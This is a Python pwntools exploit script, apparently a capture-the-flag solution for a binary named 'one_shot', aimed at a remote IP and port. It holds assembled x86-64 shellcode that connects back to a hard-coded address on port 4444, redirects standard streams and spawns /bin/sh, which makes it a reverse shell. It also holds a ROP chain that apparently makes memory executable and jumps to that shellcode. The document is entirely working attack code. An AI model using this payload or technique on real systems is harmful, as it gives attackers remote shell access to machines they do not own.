from pwn import *

#r = process(["./one_shot"],env={"LD_PRELOAD":"./libc-2.24.so"})
r = remote("178.128.87.12", 31338)
context.arch = "amd64"



payload = p32(0x8a919ff0)+"ffff" + asm("""
	mov rdi,0xb9a7718c5c110002
        push rdi
        push 42
        push 16
        push 41
        push 1
        push 2

        pop rdi
        pop rsi
        xor rdx, rdx
        pop rax
        syscall

        mov rdi, rax
        pop rdx
        pop rax
        mov rsi, rsp
        syscall

        xor rsi, rsi
loop:
        mov al, 33
        syscall
        inc rsi
        cmp rsi, 2
        jle loop

        xor rax, rax
        mov rdi, 0x68732f6e69622f2f
        xor rsi, rsi
        push rsi
        push rdi
        mov rdi, rsp
        xor rdx, rdx
        mov al, 59
        syscall
""")
print hex(len(payload))
payload = payload.ljust(0x80,"\x00")
#0x00000000004006f7 : mov eax, dword ptr [rbp - 0xc] ; pop rbx ; pop rbp ; ret
#0x000000000040064b : mov rbp, rsp ; call rax
#0x0000000000400843 : pop rdi ; ret
#0x00000000004005c0 : pop rbp ; ret
context.arch = "amd64"

shellcode = asm("""
	mov QWORD PTR [rbx],rbp
	ret
""")[::-1]
print len(shellcode)
shellcode = int(shellcode.encode("hex"),16)
print hex(shellcode)

al = asm("""
	push rdx
	pop rcx
	push rsp
	pop rsi
        rep movs QWORD PTR [rdi], QWORD PTR [rsi]
	ret
""")[::-1]
print len(al)
payload += flat([
	0x4001a1+0xc,0x4006f7,0x0,0x601038+1+0x1c,
	0x400670,0x0,0x4003fa-0x3+0xc,0x4006f7,0x0,0x601038-3+0x1c,
	0x400670,0x0,0x400671-0x3+0xc,0x4006f7,0x0,0x601020-0x3+0x4,0x040079C,
	0x40083a,0x0,0x4000d9+0xc,0x601020,7,0x1000,0x601000,
	0x4006f7,0x0,0x1,
	0x400820,0x0,0x0,0x601038+0xc,0x601020,0x601000,0x1000,7,
	0x4006f7,0x0,(shellcode&(0xffffffff))<<32,
	0x40064b,0x4006f7,0x0,0x601500+0x4+0x4,0x040079C,
	0x4006fa,0x601600,int(al.encode("hex"),16),0x601504,
	0x601600,0x601008
])

payload += asm("""
        mov rcx,0x10
	lea rsi,[rsp-0x200]
        rep movs QWORD PTR [rdi], QWORD PTR [rsi]
	sub rdi,0x80
        jmp rdi
""")

input(hex(len(payload)))
r.sendline(payload)

r.interactive()
